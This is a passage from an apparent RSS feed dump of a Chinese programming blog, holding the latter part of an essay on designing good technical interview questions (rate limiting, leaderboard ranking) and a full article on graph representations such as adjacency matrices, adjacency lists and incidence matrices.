队列。也许这其中存在着问题分析和需求整理的空间，但对于具体算法题来说，这个空间显然并不大，而且候选人闷头就写了，这方面无从考察。对于一个初级工程师的面试来说可能还好一些，我通常没有微词；可对于一个要去面试一个经验丰富的工程师，我是很不赞成纯算法题面试的，而这就是其中的一个重要原因。</li>\n <li>根据需求来设计系统的能力。这一点的覆盖基本为 0。上来就写代码了，不清楚思考的过程，也更谈不上什么系统设计了。</li>\n <li>将核心逻辑实现的能力。这条确实是这种面试方式能够覆盖的部分，因为整个过程，就是候选人思考并编码实现的过程，只不过，面试官能得到的只有一个 “结果”，而非整个 “过程”。这样的数据，能反映出来在核心逻辑实现方面的价值，就要大打折扣了。</li>\n <li>经验和其它工程能力。也许能够从代码的实现上获知一部分，但这一条考察的程度也显然是很不够的。</li>\n</ol> \n<p>再来看非技术能力方面：</p> \n<ol>\n <li>沟通合作的能力。这是最大的问题，因为这方面是远远不足的，整个过程没有沟通，没有合作，只有默默地做题。</li>\n <li>热情和兴趣。这个过程很难从这个角度获取足够的候选人在热情和兴趣方面展示出来的信息。</li>\n <li>学习能力。同上。</li>\n</ol> \n<p>也就是说，除了 “将核心逻辑实现的能力” 可能还勉强过得去，这样的面试方式，并无法全面、合理地考察候选人作为软件工程师的综合素质。</p> \n<p><strong><span style=\"color:#cf2e2e\" class=\"tadv-color\">事实上，如果你联想实际工作。如果你的团队中有这样一个工程师，拿到一句简单的需求，不确认问题，不沟通设计，不讨论方案，直接就开始埋头苦干，就算能写出可以工作的代码来，这是不是依然是一件无比恐怖的事情？</span></strong>显然，我们的面试要尽可能避免这样的事情在真实世界中发生。我们要找的是软件工程师，不是只会刷题编码者。</p> \n<p>这也是我把这个案例，放在开头，作为反面案例的原因之一。</p> \n<p>等等，“之一”！难道还有别的原因？</p> \n<p>是的，这还没完，这个案例还有着其它弊端，我想再卖个关子——而现在，你可以想一想，再往下看。</p> \n<h3>怎样的问题才是 “好” 问题？</h3> \n<p>终于要正面回答标题中的问题了，到底怎样的问题才能真正称得上 “好” 问题呢？下面是我认为最重要的几条衡量标准。</p> \n<h4>从模糊到清晰</h4> \n<p><strong><span style=\"color:#cf2e2e\" class=\"tadv-color\">首先，这个问题在一开始要足够模糊</span></strong>，以便让候选人可以逐层递进，逐步细化，寻根究底。<strong><span style=\"color:#cf2e2e\" class=\"tadv-color\">这个过程，其实就是将 “具体问题” 经过分析、归纳、思考、抽象并将其映射成为一个 “软件问题” 的过程。</span></strong>在问题变得清晰的过程中，理想的情况是，候选人可以表现出主动性，即候选人可以在多数情况下引领讨论的思路，而不是面试官。面试官需要顺着候选人的思路，逐步框定下问题的讨论范畴，并明确到其核心实现是确实可以用软件的办法实现的。</p> \n<p>在这样的状态下，候选人可以以自然的状态，具备相当自由度地发挥自己的能力。从这个过程中，可以观察得到太多候选人的不同角度的特质了。通过这种方式，也可以很大程度避免了已经知道 “标准答案” 的面试官，由于思路的局限性，而给面试施加的源自于主观偏好的影响。</p> \n<p>这就好像是开放世界的 RPG 游戏，有多个不同的路径都可以完成任务，玩家可以决策并决定主角的走向，但是这一切始终还要在游戏设计者的掌控之内。这当然是说的理想状态，有时候会有偏差，但我们朝着这个方向努力。这也对面试官驾驭不同的状况有着很高的要求，毕竟，面试官要对这个问题前前后后足够的熟悉，以便应对各种不同的细化场景。有一个常见的方式，是可以从一个自己已经足够熟悉的问题开始，比如自己曾经多年工作涉及的某类系统。</p> \n<p>我来举一个具体例子。比如，有这样一个问题：</p> \n<blockquote class=\"wp-block-quote\">\n <p>怎样设计一个流量控制系统？</p>\n</blockquote> \n<p>这就是一个模糊到没法再模糊的问题了。不知你会不会产生下面这样的问题：</p> \n<ul>\n <li>什么系统需要流量控制？</li>\n <li>现在的流量是多少？</li>\n <li>需要支持到什么时间精度？</li>\n <li>流量控制的规则怎么定义？</li>\n <li>超过流量的请求怎么处理？</li>\n <li>……</li>\n</ul> \n<p>其实，这些都或多或少是需要面试官和候选人一起逐步思考、分析和明确的。在这个过程中，可以考察的内容太多太多了。</p> \n<p><strong><span style=\"color:#cf2e2e\" class=\"tadv-color\">事实上，针对不同程度的候选人，上述这个问题给出的最原始的模糊程度是不一样的，问题越是模糊，这部分对于候选人的要求也就越高。</span></strong>对于一个工作十多年的，有着多年系统设计经验的工程师来说，上面这些问题大致都应该是他/她能够主动提问，或是主动引领明确的。</p> \n<p>值得一提的是，理想的问题最好还有一些隐藏的 “坑”，能否把这些坑识别出来，也是对于工程能力方面，一个很好的小的考察点。比方说，优秀的候选人应该想到，流量控制可以基于绝对时间窗口，或是相对时间窗口来进行的，但是要真正保护系统，相对时间窗口才是最理想的。当然在实现难度上，相对时间窗口，往往会更难一些。</p> \n<p>而对于一个没有工作经验，并将要研究生毕业的候选人来说，问这样一个模糊的问题，往往带来了过大的难度，不但不容易推进面试的进程，还可能给候选人带来沮丧的心理。我们不希望看到，候选人拿到问题以后就懵了，如果发现候选人推进有困难，面试官需要介入并帮助。</p> \n<p>因此根据候选人的程度，这需要面试官主动回答这些问题，或是直接缩小或明确问题的范畴，当这个问题的范畴缩到最小时，这可以是一个直接存在多种解法的算法题。极端地说，这个问题可以一直缩小到这样的程度：</p> \n<blockquote class=\"wp-block-quote\">\n <p>假定说有这样一个 API，名字叫做 isAllowed，这个 API 在系统每次收到请求的时候就调用，传入的是请求对象，传出 boolean 值表示是否允许这次调用——如果最近一分钟内调用次数小于 10000 次就允许，反之则不允许。你能否将这个 API 实现出来？</p>\n</blockquote> \n<p>如果候选人还一脸迷茫，可以提供这样的参考 API：</p> \n<div> \n <div id=\"highlighter_789725\" class=\"syntaxhighlighter  java\"> \n  <div class=\"toolbar\">\n   <a class=\"toolbar_item command_help help\" href=\"https://www.raychase.net/?p=5934#\">?</a>\n  </div> \n  <table border=\"0\" cellspacing=\"0\" cellpadding=\"0\"> \n   <tbody> \n    <tr> \n     <td class=\"gutter\"> \n      <div class=\"line number1 index0 alt2\">\n       1\n      </div> \n      <div class=\"line number2 index1 alt1\">\n       2\n      </div> \n      <div class=\"line number3 index2 alt2\">\n       3\n      </div> \n      <div class=\"line number4 index3 alt1\">\n       4\n      </div> \n      <div class=\"line number5 index4 alt2\">\n       5\n      </div> </td> \n     <td class=\"code\"> \n      <div class=\"container\"> \n       <div class=\"line number1 index0 alt2\">\n        <code class=\"java keyword\">class</code> \n        <code class=\"java plain\">RateLimiter {</code>\n       </div> \n       <div class=\"line number2 index1 alt1\">\n        <code class=\"java spaces\">&nbsp;&nbsp;&nbsp;&nbsp;</code>\n        <code class=\"java keyword\">public</code> \n        <code class=\"java keyword\">boolean</code> \n        <code class=\"java plain\">isAllowed(Request req) {</code>\n       </div> \n       <div class=\"line number3 index2 alt2\">\n        <code class=\"java spaces\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code>\n        <code class=\"java comments\">// TODO</code>\n       </div> \n       <div class=\"line number4 index3 alt1\">\n        <code class=\"java spaces\">&nbsp;&nbsp;&nbsp;&nbsp;</code>\n        <code class=\"java plain\">}</code>\n       </div> \n       <div class=\"line number5 index4 alt2\">\n        <code class=\"java plain\">}</code>\n       </div> \n      </div> </td> \n    </tr> \n   </tbody> \n  </table> \n </div> \n</div> \n<p>你看，这只是一个将问题明确、细化和分解的过程，并没有涉及到实际实现代码该用的算法。但是，上面提的那些问题，要么都通过这个例子明确了，要么都给出具体数字了，这本身，就将一个模糊的问题，降低难度明确为一个具体的算法问题了。</p> \n<h4>不止一个解</h4> \n<p><strong><span style=\"color:#cf2e2e\" class=\"tadv-color\">前面一步已经谈到了有不同的方式可将模糊的 “实际问题” 映射到了一个可解的 “软件问题”，那么现在，这个 “软件问题” 依然没有标准答案。</span></strong>可能有几个参考答案，它们互相比较起来各有优劣。大多数情况下，候选人的思路，都在这几个参考答案的思路之中，但有时也能看到特立独行的新奇思路。</p> \n<p>如同前一步所说的那样，对于不同级别的软件工程师职位来说，需求分析、系统设计等等这些方面的要求可能有着很大的差别；但是在这一步，对于数据结构和算法这样的基础能力，却是接近的。</p> \n<p>对于这里谈到的流量控的算法来说，实现方式是有很多种的，代码复杂程度，控制精度，时间复杂度和空间复杂度等等都有着非常大的区别。当然此时涉及到的，已经基本只是算法层面的话题了，就算法本身而言，我在极客时间专栏中对其中的几个典型方法<a rel=\"noreferrer noopener\" aria-label=\"做了一些介绍 (opens in a new tab)\" href=\"https://time.geekbang.org/column/article/173359\" target=\"_blank\">做了一些介绍</a>，感兴趣的话可以阅读。</p> \n<p>我可以再举一个我曾经经常在面试中拿来使用的例子：</p> \n<blockquote class=\"wp-block-quote\">\n <p>某社交网站有两百万的注册用户，每个用户都有积分属性，且积分根据用户在社交网站上的行为而不断有小幅度的频繁变更（比如登陆一次就+1 分，评论一次就+2 分等等），怎样设计一种算法，能够高效、准确地实时获取指定用户在所有用户中基于积分的排名？</p>\n</blockquote> \n<p>上面的问题从模糊逐步落实到实现上的时候，异步、定时地排序，是最容易想到的方案，而题目表述中的 “高效” 和 “实时” 这两个修饰词让这个问题变得困难。这个过程中，我见到的不错的办法就至少有七、八种，比方说，下面这个推进问题解决的例子：</p> \n<ol>\n <li>候选人：在需要的时候进行排序，方案是……</li>\n <li>面试官：好，这样的方式下，时间、空间复杂度是多少？</li>\n <li>候选人：……（说着说着自己意识到时间消耗可能巨大）</li>\n <li>面试官：对，你能否优化？</li>\n <li>候选人：……（提出了一些优化思路，但是他自己对它们的实时性也不满意）</li>\n <li>面试官：好，有换个角度更进一步优化的方式吗？</li>\n <li>候选人：对了，可以让数据一直是排好序的！</li>\n <li>面试官：好主意，那你怎么设计数据结构呢？</li>\n <li>候选人：我可以使用一个 map 来保存用户 id 到积分的映射，再把积分从小到大按序放在数组中，这样二分查找就可以找到对应积分所处的排名。</li>\n <li>面试官：听起来不错，那么这时候获取排名的复杂度是多少？</li>\n <li>候选人：……</li>\n <li>面试官：对，每当用户的积分小幅变化的时候，你怎么维持这个数组依然有序？</li>\n <li>候选人：从数组中拿掉一个老的积分，再放入一个新的积分……</li>\n <li>面试官：这个变更影响的数据量有多少，时间复杂度又是如何？</li>\n <li>候选人：……</li>\n <li>面试官：不错，可这个方法有什么问题吗？</li>\n <li>候选人：（恍然大悟）如果新添加一个用户，新的积分会出现在数组头部，数组内的所有数据都要向后移动一个单位！</li>\n <li>面试官：没错，那你打算怎么优化？</li>\n <li>候选人：可以把数组内的积分从大到小排序，这样新添加的用户所对应的积分总在尾部。</li>\n <li>面试官：很好，这个方法还有什么问题吗？</li>\n <li>候选人：……（意识到在某些情况下，有很多用户拥有相同的积分，这时时间复杂度会退化）</li>\n <li>面试官：那样的话，你怎么优化？</li>\n <li>候选人：数组的元素除了记录当前积分，还记录有多少个用户具有这个积分，从而消除相同积分的重复元素……</li>\n <li>面试官：很好，可这个方法会带来一个问题，你能想到吗？</li>\n <li>候选人：对了，如果积分变化以后，新的积分是没有出现过的，那么添加到数组里，就是一个新元素，于是所有比它小的积分全部都要向后移动一个单位。</li>\n <li>面试官：非常好，那么你怎么优化？</li>\n <li>候选人：如果使用链表来代替数组就可以避免这个问题，（突然意识到）可是链表我就没法二分查找了……</li>\n <li>面试官：没错，那什么样的数据结构和链表在这方面具有一定相似性，又能够具备二分查找相似的时间复杂度？</li>\n <li>候选人：……（这一步能回答出来答案就很多了，很多都是很不错的思路，比如有用跳表的，有用二叉搜索树的等等）</li>\n</ol> \n<p>这只是一个简化了的片段，实际的沟通的内容远比这部分内容多，但是从中也依然可以管中窥豹，看出问题解决的过程是怎样逐步推进的。如果你对这个问题本身感兴趣的话，可以参阅一下 <a rel=\"noreferrer noopener\" aria-label=\"《排行榜算法设计实现比较》(opens in a new tab)\" href=\"https://gameinstitute.qq.com/community/detail/101951\" target=\"_blank\">《排行榜算法设计实现比较》</a>和 <a rel=\"noreferrer noopener\" aria-label=\"《海量用户积分排名算法》(opens in a new tab)\" href=\"https://tonydeng.github.io/slideshare/massive-user-ranking-algorithm/\" target=\"_blank\">《海量用户积分排名算法》</a>这两篇文章，它们讨论了其中的几个思路；另外，我以前在<a href=\"https://www.raychase.net/1625\" target=\"_blank\" rel=\"noreferrer noopener\" aria-label=\"这篇文章 (opens in a new tab)\">这篇文章</a>里也简单讨论了其中的一个思路。</p> \n<p>从这里也可以看出，无论是从实际问题细化到软件问题，还是求解这个软件问题，都存在着多条通往罗马的道路，看起来很美好，但这样的问题设计和面试把控并不容易。但既然大家都是软件工程师，是未来有可能一起工作的工程师，面试官的能力和可能就和候选人接近，于是，为了保证面试的效果，就一定要精心准备这样的问题，而不能指望随机和临场想出来一个 “好” 的问题提问。</p> \n<h4>围绕问题的解决要完整</h4> \n<p>这个问题的分析、讨论和解答过程要完整。对，其实这一点说的已经不是问题本身了，而是攻克这个问题的过程了。</p> \n<p>这指的是<strong><span style=\"color:#cf2e2e\" class=\"tadv-color\">整个过程要努力让候选人能够抵达 “踮踮脚能够到” 的难度，并且能够完成从确认、分析、讨论、编码、验证和改进等一个过程。</span></strong>这让整个面试显得完整，同时带来了这样两大好处：</p> \n<ul>\n <li>对于面试官来讲，这样一个完整的过程，可以更全面地考察候选人，避免陷入视角过窄和一叶障目的情境。同时，“踮踮脚能够到” 的难度，又可以给整个考察的进程具备较为合理的预期。</li>\n <li>对于候选人来讲，心态可以得到一定程度的平复，不沮丧，能够 “完整地” 面试完一轮，能够收获信心。别忘了，面试是双向的，给候选人一个良好的印象是很重要的。</li>\n</ul> \n<p>前文我举的这个将问题从模糊到逐步清晰化的这个例子，就是一个需要面试官根据候选人情况动态调整的例子。<strong><span style=\"color:#cf2e2e\" class=\"tadv-color\">在候选人能够经过思考而快速推进问题解决进展的时候，要让出主动权，以被动回答和鼓励为主；但在候选人卡壳的时候，要夺回主动权，及时给出提示和引导。</span></strong></p> \n<p>在落到数据结构和算法上面的时候，极少有候选人能够在叙述思路的时候直接给出最优解的。这时候，如果时间充裕，特别是在候选人进展非常顺利的时候，可以不断提示、追问以要求 “代码前优化”，一步一步优化到他/她的问题解决的能力边界，这就是其中的一个探寻其 “踮踮脚能够到” 的这个问题解决能力之边界的一个办法。但这个过程的前提，是一定要给编码留足时间。当然，如果候选人不能在限定时间内给出清晰的优化后思路，那不妨就退一步到原先那个算法角度不那么 “好”，但是思路清晰的解法上，并落实到代码。</p> \n<p>比方说，对于前文所述的那个流量控制的问题，候选人在还有半个小时的时候就想到了使用一个时间复杂度为 O(N) 的解，而面试官认为时间还比较充裕，那就可以尝试挑战一下候选人 “能否再优化一下复杂度？”。</p> \n<p>有些时候，由于前面的过程磕磕绊绊，时间剩下不多了，依然只有时间复杂度较高的 brute force 的解法，那么将这个解法实现了，其实也是一个不错的选择。有时候时间实在比较紧张，可以要求实现一部分核心代码，这些都比由于时间太短而代码写了一半匆匆收尾要好得多。我的经验是，在讨论充分，思路清晰的情况下，代码完成的时间，一般只需要 5 到 15 分钟，这样的代码量对于面试来说是比较合理的。</p> \n<p>当然，相较而言，一种更为糟糕的结果是，一直到最后，讨论的深度依然离编码尚远，甚至依然停留在一个很高的泛泛而谈的层面。</p> \n<p>如果在编码完成之后，尚有时间，优秀的候选人会拿实际的例子去验证代码的正确性。而面试官也可以和候选人讨论 “代码后优化”，比如以下的问题：</p> \n<ul>\n <li>你能否进一步优化算法以提高时间/空间复杂度？</li>\n <li>如果是工业级别的代码，你觉得代码还有哪些问题？</li>\n <li>你该怎样去设计测试，来保证这段代码的正确性 ？</li>\n</ul> \n<h4>对考察项的覆盖兼有深度和广度</h4> \n<p><strong><span style=\"color:#cf2e2e\" class=\"tadv-color\">这个问题要能够考察前文所述的技术能力和非技术能力。</span></strong></p> \n<p>这里说的覆盖，不一定要全部覆盖，但是要覆盖其中的大部分，并且对于每一个考察项要具备一定的考察深度。我见到过不少其它的面试风格，但我认为这样就着一个模糊的主要问题（话题）逐步展开的方式是最好的。因为它可以兼具广度和深度的平衡。具体来说：</p> \n<p>面试很容易走向的一个极端就是考虑广度，但缺乏深度。比如一种风格是绝大部分的面试时间用来询问候选人的项目和经验，让候选人自己介绍，而面试官跟进追问。这原本是一种很好的方式，但是由于候选人对自己的项目通常远比面试官熟悉得多，除非明确的同一领域，否则面试官较难对于其中的内容挖掘到足够的深度，从而识别出候选人是真正做事的人，还是夸夸其谈的人。这也是这种方式理论可行，但实际开展难度较大的原因之一。</p> \n<p>另一个极端，自然就是考虑深度，但缺乏广度。比如给出一个过于具体的问题，缺乏发挥和迂回的空间，对这个问题所涉及的很小一部分深度挖掘，甚至纠缠于某个特殊而单一的 case 很长时间，但是却只能覆盖很少的考察角度。</p> \n<p>由于深度和广度都是可控的，那么这样的可以拿来问不同经验和不同技术背景的工程师候选人。这样对于面试官来说，可以获得足够的数据，便于在遇到新的候选人的时候，能够进行横向比较，做出更准确的评估。比方说，过去某级别的候选人能够在面对这个问题的时候，能够达到什么样的级别，而如今这个候选人有着类似表现，这就可以以过去的那个例子来作为参考比较了。</p> \n<h3>再次回看那个案例</h3> \n<p>现在，让我们再次回到文章开头那个例子问题，除了已经提到的考察项的覆盖不够，它还有哪些问题呢？参考上文已经提到了 “好” 问题的标准，我觉得其中的这样两条是违背的：</p> \n<p>从模糊到清晰。显然，问题给出的时候就已经相对比较清晰了，这样的方式并不能模拟软件工程师日常面对的许多模糊而困难的实际问题。我已经提到，对于经验丰富的候选人来说，这样的问题无法重现将实际问题映射到软件问题这样的一个重要思考过程。</p> \n<p>另一个是，围绕问题的解决要完整。示例问题的考察过程中，只有缺乏互动的编码环节，没有其它过程，没有编码前的分析、思考和优化，也没有编码后的测试、改进和优化。考虑到 LRU 完整算法是一个实现代码量偏大的问题，拿来放到面试中做一个完整实现，由于会消耗过多的时间，挤压其它时间，因此显得有些过了。</p> \n<h3>其它 “不好” 的问题</h3> \n<p>前面说了过于清晰的纯算法题的 “不好” 之处，也说了 “好” 问题的例子，最后我想再来说几类其它的且典型的 “不好” 的例子。</p> \n<h4>被使用过太多遍的问题</h4> \n<p>很多公司（如 Google 和 Facebook）都有参考题库，题库会不断更新，其中一个重要原因，就是要尽量避免候选人做过被问到的题目。而且，问题越明确和具体，一旦候选人做过，考察的效果就越不客观。比方说，下面这个问题本来是个很不错的问题，但由于是被过于广泛地使用了，因此我还是不建议拿它来用作面试题的：</p> \n<blockquote class=\"wp-block-quote\">\n <p>怎样设计一个短网址系统？</p>\n</blockquote> \n<h4>依赖于特定语言或框架</h4> \n<p>而这里说的依赖不好，是因为考虑到候选人不同的技术背景，如果没有特殊的需要，避免这样的依赖，以避免产生不应有的错误的衡量数据。</p> \n<p>比方说，问一个关于 JVM 的问题，这个问题可以问，特别是在候选人强调其具备一定 Java 背景的前提下。但是这样的问题不能成为 “主菜”，尤其是候选人不一定具备很强的 Java 背景，这样的方式会导致考察的偏颇。</p> \n<h4>过于复杂的规则或背景知识</h4> \n<p>这主要是基于面试的有限时间考虑的，过于复杂的规则或背景知识，容易把时间消耗到澄清它们上面；另外，有些背景知识并非是所有人都熟知的，这就会引起考察标准的非预期。我给一个经典的反面例子：</p> \n<blockquote class=\"wp-block-quote\">\n <p>设计一个算法，把一个小于一百万的正整数，使用罗马数字来表示。</p>\n</blockquote> \n<p>这个问题描述简洁，但是拿来做技术面试中的主要问题，其中一个不妥之处就是，不是所有人都很清楚一百万内的罗马数字表示法的。对于不清楚的人来说，要搞清楚这个表示法的规则，就已经是一件有些复杂和耗时的事情了。显然，这个罗马数字表示法的知识点，不应该成为考察和衡量的标准。</p> \n<p>当然，有时候有些问题的背景知识是冷门的，但是表述简洁，那么这样的话只要 面试官能够主动、迅速地说清楚，拿来使用是没问题的。</p> \n<h4>知识性问题</h4> \n<p>我想特别谈一谈，对于知识性问题的提问。在讨论问题的过程中，如果涉及到关联的具体知识，那么提问一些基础知识是一个不错的选择，这是考察候选人 CS 基础是否牢靠的方式。比如候选人提到使用 HashMap，而他/她最熟悉的编程语言是 C++，那么询问在 C++中 HashMap 是怎样实现的就是一个可行的问题。而且，由于这样的问题是嵌套在前述的这个大流量控制问题的解决过程中的，更显得自然而不突兀。</p> \n<p>反之，如果这样的知识性问题较为冷门或浅表，和当前的讨论中的问题无关，或是不在候选人的知识体系内，这样的问题就值得商榷了。比如，仅仅因为自己的项目组使用 Spring，面试官就询问候选人 Spring 的 bean 的单例和多例分别是怎样配置的，而恰巧候选人又是 C++背景，对于这部分并不熟悉，这样的问题除了给候选人造成困扰以外，意义就不太大了。</p> \n<p><strong><span style=\"color:#cf2e2e\" class=\"tadv-color\">如果把知识性问题作为主要问题来提问，我认为是不适合的。因为一方面它不具备普适性，另一方面它又具备太强的随机性。</span></strong></p> \n<p>这里不具备普适性这一条，指的是不同技术背景的软件工程师候选人都要能够适合参与这个问题的解答。举例来说，如果问 “Tomcat 的线程池的配置策略？”，这就是一个不具备普适性的问题，这是一个偏重 “知识性” 的问题，如果候选人没有使用过 Tomcat，或是只是略有了解，很可能就栽了。</p> \n<p>而具备太强的随机性这一条，指的是一旦待考察的问题具体以后，这个问题就容易从对 “能力” 的考察变成了对 “知识” 的考察，而这个知识，又恰恰是比较容易随机的。也就是说，我们不希望候选人 “恰巧” 知道或不知道某一个细小的知识点，来决定他/她是否通过这项考察。</p> \n<p>无论如何，知识性的问题作为考察的辅助方式可以，但不应成为主角。我还是觉得我们应当能把更多的时间，留给主要问题的解决过程本身。</p> \n<p>关于 “技术面试中，什么样的问题才是好问题？”，我就说这么多吧。也欢迎你分享你的看法，我们一起讨论。</p> \n<p><strong><font color=\"#ff0000\">文章未经特殊标明皆为本人原创，未经许可不得用于任何商业用途，转载请保持完整性并注明来源链接 <a href=\"https://www.raychase.net/5934\">《四火的唠叨》</a></font></strong></p>\n<div class=\"yarpp-related-rss\"> \n <p>你可能也喜欢看：</p>\n <ol> \n  <li><a href=\"https://www.raychase.net/371\" rel=\"bookmark\" title=\"那些糟糕的面试和那些屎问题\">那些糟糕的面试和那些屎问题 </a></li> \n  <li><a href=\"https://www.raychase.net/1040\" rel=\"bookmark\" title=\"我们到底要怎样招程序员？\">我们到底要怎样招程序员？ </a></li> \n  <li><a href=\"https://www.raychase.net/5749\" rel=\"bookmark\" title=\"近期面试观摩的一些思考\">近期面试观摩的一些思考 </a></li> \n  <li><a href=\"https://www.raychase.net/1642\" rel=\"bookmark\" title=\"不适合 Hadoop 解决的问题\">不适合 Hadoop 解决的问题 </a></li> \n  <li><a href=\"https://www.raychase.net/2484\" rel=\"bookmark\" title=\"层次\">层次 </a></li> \n </ol> \n</div>","descriptionType":"html","publishedDate":"Wed, 12 Feb 2020 07:38:19 +0000","feedId":2871,"bgimg":"https://www.raychase.net/wp-content/uploads/2020/02/interview.jpg","linkMd5":"887c898e7462a22bef26f64139fbd840","bgimgJsdelivr":"https://cdn.jsdelivr.net/gh/myreaderx10/cdn8@2020_3/2020/08/24/15-45-04-898_76581a5648a574a0.webp","destWidth":1280,"destHeight":853,"sourceBytes":99383,"destBytes":47048,"author":"四火","articleImgCdnMap":{"https://www.raychase.net/wp-content/uploads/2020/02/interview.jpg":"https://cdn.jsdelivr.net/gh/myreaderx10/cdn8@2020_3/2020/08/24/15-45-04-898_76581a5648a574a0.webp"},"publishedOrCreatedDate":1598283901924},{"createdTime":"2020-08-24 23:45:01","updatedTime":"2020-08-24 23:45:01","title":"图的表示方法","link":"https://www.raychase.net/?p=6197","description":"\n<p>我觉得去理解数据结构的时候，需要注意到它其实包含两个层面。一个层面是高一级的，从功能、接口的角度去理解，比如说堆，有什么功用，都有怎样的 API；另一个层面是低一级的，从结构和实现的角度去理解，比如堆的实现，可以用数组实现，也可以用单独的节点对象+指针实现。上面一层相同，但是下面一层不同，功能上可能基本一致，但是性能上针对不同的应用场景就可以天差地别。</p>\n\n\n\n<p>图就是另外一个典型例子，无向图也好，有向图也好，这是从功能上说的，但它们各自的实现，或者说基于的 “表示方法” 有多种。我记得在学习数据结构早期，基本上没有比较系统地去比较它们，那今天就把这一课补上。</p>\n\n\n\n<figure class=\"wp-block-image size-large\"><img src=\"https://www.raychase.net/wp-content/uploads/2020/08/Snip20200809_2.png\" alt=\"\" class=\"wp-image-6198\"/></figure>\n\n\n\n<p>比如上面这个有向图，四个顶点，每条边还带权。我拿带权的有向图来举例，因为我觉得它是相对来说较为复杂的一种图，对于无权和无向图来说，会比它简单一些。</p>\n\n\n\n<h3>Adjacency Matrix（邻接矩阵）</h3>\n\n\n\n<figure class=\"wp-block-image size-large\"><img src=\"https://www.raychase.net/wp-content/uploads/2020/08/Snip20200809_3.png\" alt=\"\" class=\"wp-image-6199\"/></figure>\n\n\n\n<p>矩阵在编程语言中最常见和自然的表达法就是二维数组，对于许多语言来说，用 null 来表示两个顶点不可直达是很自然的。上面这样表示的边都是带权的，这样的矩阵也被称为距离矩阵（Distance Matrix）。</p>\n\n\n\n<p>优点：简单、直观，而且对于任意两点之间的直接关系，可以以 O(1) 的时间复杂度获得。</p>\n\n\n\n<p>缺点：在点较多而边较少的时候，成为较稀疏的矩阵，在存储空间上显得浪费。另外，由于这个结构，两个维度都是基于顶点的，对于一些以边主导的操作可能不够友好，比如说，要遍历所有的边，这就必须遍历矩阵的所有节点。</p>\n\n\n\n<h3>Adjacency List（邻接表）</h3>\n\n\n\n<figure class=\"wp-block-image size-large\"><img src=\"https://www.raychase.net/wp-content/uploads/2020/08/Snip20200809_5.png\" alt=\"\" class=\"wp-image-6210\"/></figure>\n\n\n\n<p>和邻接矩阵相比，二维数组变成了单向链表集合。每个节点表示一个顶点，包含一个指针和相应指针指向顶点所对应的权值。每一个链表的非头元素都表示从头部节点所代表的顶点可以直接指向的其它顶点。不过我们平时更多情况下，会把这些节点都放到一个单独的集合里面去，这个集合可以是 Array, ArrayList, LinkedList 或者 HashSet，于是它就变成了这样：</p>\n\n\n\n<figure class=\"wp-block-image size-large\"><img src=\"https://www.raychase.net/wp-content/uploads/2020/08/image.png\" alt=\"\" class=\"wp-image-6211\"/></figure>\n\n\n\n<p>这种方式应该是最常见的，若干个 pair，每个 pair 的 key 都是作为边的起点的顶点，value 则是终点和边的权值的集合。</p>\n\n\n\n<p>还有两种用链表来代替二维数组的变体。一种叫做 Orthogonal Linked List（十字链表），对于从起点找终点和从终点找起点都很方便，它本质上也是矩阵压缩方式的一种；另一种叫做邻接多重表，它把边独立成一种 “边节点”，这样在无向图中，就不需要把边（顶点之间的映射关联关系）存储两次。它们相对来说都更为复杂，用得也没有上面两种多。</p>\n\n\n\n<p>优点：无论哪一种，和邻接表比起来，在面临稀疏矩阵的时候，都要更加节约空间。并且，作为链表 vs 数组的优势，在添加删除节点的时候都要更加容易（不用 shift 大量元素）。</p>\n\n\n\n<p>缺点：相较于邻接表来说，结构上要略微复杂一些，操作上的开销也往往更大一些。</p>\n\n\n\n<h3>Incidence Matrix（关联矩阵）</h3>\n\n\n\n<p>Incidence Maxtrix 也有翻译成输入矩阵，我觉得也很形象，但是有的材料把它和前面的邻接矩阵完全归为一类我觉得就不妥了。这里的 “incidence” 需要这样理解：如果一个顶点被一条边所连接，那么这个顶点对于这条边来说就是 “incident” 的。所以这个关联矩阵一定是顶点和边的对应关系矩阵。</p>\n\n\n\n<figure class=\"wp-block-image size-large\"><img src=\"https://www.raychase.net/wp-content/uploads/2020/08/Snip20200809_4.png\" alt=\"\" class=\"wp-image-6201\"/></figure>\n\n\n\n<p>依然是二维数组实现的矩阵，行表示顶点，列表示边。边的具体信息，例如它所具有的权值（不同向权值不同）存储在边这个数据结构内部，而这个矩阵只表示顶点和边之间的关联关系。并且，二维数组依然可以有效地表示出边的方向性。</p>\n\n\n\n<p>此外，矩阵中的数值可以进一步强化。比如，上面的数字 1 表示以对应的顶点为起点，是否存在该对应的边；还可以引入一个值-1，用以表示以对应的顶点为终点，是否存在该对应的边。</p>\n\n\n\n<p>优点：和邻接矩阵比起来，对于需要根据一条单独的边来获取它和点之间的关联信息，就可以从关联矩阵中直接获取。再有一个，如果两个点之间有同方向的一条以上的边，用关联矩阵相对来说就比较容易表示。</p>\n\n\n\n<p>缺点：和邻接矩阵类似，较稀疏的矩阵会导致较大的空间浪费。如果需要点之间的关系，它就不如邻接矩阵高效。</p>\n\n\n\n<p>最后，对于上面三者大体上时间复杂度的总结，可参加下面这张表（来自<a href=\"https://en.wikipedia.org/wiki/Graph_(abstract_data_type)#Representations\">维基百科</a>）：</p>\n\n\n\n<figure class=\"wp-block-image size-large\"><img src=\"https://www.raychase.net/wp-content/uploads/2020/08/Snip20200809_7.png\" alt=\"\" class=\"wp-image-6212\"/></figure>\n\n\n\n<p></p>\n<p><strong><font color=\"#ff0000\">文章未经特殊标明皆为本人原创，未经许可不得用于任何商业用途，转载请保持完整性并注明来源链接 <a href=\"https://www.raychase.net/6197\">《四火的唠叨》</a></font></strong></p><div class='yarpp-related-rss'>\n<p>你可能也喜欢看：</p><ol>\n<li><a href=\"https://www.raychase.net/1239\" rel=\"bookmark\" title=\"代码洁癖症的表现\">代码洁癖症的表现 </a></li>\n<li><a href=\"https://www.raychase.net/1303\" rel=\"bookmark\" title=\"Google 矩阵\">Google 矩阵 </a></li>\n<li><a href=\"https://www.raychase.net/6104\" rel=\"bookmark\" title=\"从链表存在环的问题说起\">从链表存在环的问题说起 </a></li>\n<li><a href=\"https://www.raychase.net/2687\" rel=\"bookmark\" title=\"LeetCode 题目解答——Medium 部分（下）\">LeetCode 题目解答——Medium 部分（下） </a></li>\n<li><a href=\"https://www.raychase.net/2364\" rel=\"bookmark\" title=\"一段集合操作的不同语言表达\">一段集合操作的不同语言表达 </a></li>\n</ol>\n</div>\n","descriptionType":"html","publishedDate":"Sun, 09 Aug 2020 18:00:35 